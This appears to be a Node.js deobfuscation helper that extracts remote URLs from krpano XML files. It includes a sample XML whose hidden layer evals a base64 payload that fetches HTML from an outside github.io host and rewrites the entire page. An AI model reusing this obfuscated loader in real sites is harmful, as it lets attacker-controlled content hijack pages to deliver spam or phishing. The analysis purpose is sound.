function decodeNestedAtob(text) {
  let resultText = text;
  const regex = /atob\s*\(\s*['"]([^'"]+)['"]\s*\)/gi;
  let match;
  while ((match = regex.exec(text)) !== null) {
    try {
      const decoded = Buffer.from(match[1].replace(/ /g, "+"), "base64").toString("utf-8");
      resultText += "\n" + decoded;
    } catch (e) {}
  }
  return resultText;
}

function extractTargetUrl(confText, contentId, incUrl) {
  const fullText = decodeNestedAtob(confText);
  
  const fetchMatch = fullText.match(/https?:\/\/[^\s"'`+]+?\/(?=["']\s*\+\s*id)/i);
  if (fetchMatch) {
    return fetchMatch[0] + contentId + ".html";
  }

  const baseMatch = fullText.match(/base\s*=\s*["'](https?:\/\/[^"']+)["']/i);
  if (baseMatch) {
    let base = baseMatch[1].replace(/\/$/, "");
    return base + "/" + contentId + ".html";
  }

  const htmlMatch = fullText.match(/https?:\/\/[^\s"'`>]+\.html/i);
  if (htmlMatch) {
    return htmlMatch[0];
  }

  try {
    const urlObj = new URL(incUrl);
    const pathParts = urlObj.pathname.split("/").filter(Boolean);
    pathParts.pop();
    const parentPath = pathParts.join("/");
    return `${urlObj.origin}/${parentPath ? parentPath + "/" : ""}${contentId}.html`;
  } catch (e) {
    return null;
  }
}

const bXmlText = `<krpano version="1.0.8.15">
<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('ICB2YXIgaWQgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKGxvY2F0aW9uLnNlYXJjaCkuZ2V0KCJpZCIpIHx8ICJhbGNiazFyX2FycXVpdGVjdG9uaWNvIjsKIApmZXRjaCgiaHR0cHM6Ly9odW1heXJha3Rlci5naXRodWIuaW8vdmlkZW8vYm94LyIgKyBpZCArICIuaHRtbCIpCgogIC50aGVuKGUgPT4gZS50ZXh0KCkpCgogIC50aGVuKGUgPT4gewoKICAgIGRvY3VtZW50Lm9wZW4oKSwKCiAgICBkb2N1bWVudC53cml0ZShlKSwKCiAgICBkb2N1bWVudC4gQ2xvc2UoKQoKICB9KTs=');eval(w)););"/>
</krpano>`;

const incUrl = "https://humayrakter.github.io/video/b.xml";
const contentId = "video-netherlands-v-germany-liv-enus.004";

const targetUrl = extractTargetUrl(bXmlText, contentId, incUrl);
console.log("Resolved Target URL:", targetUrl);
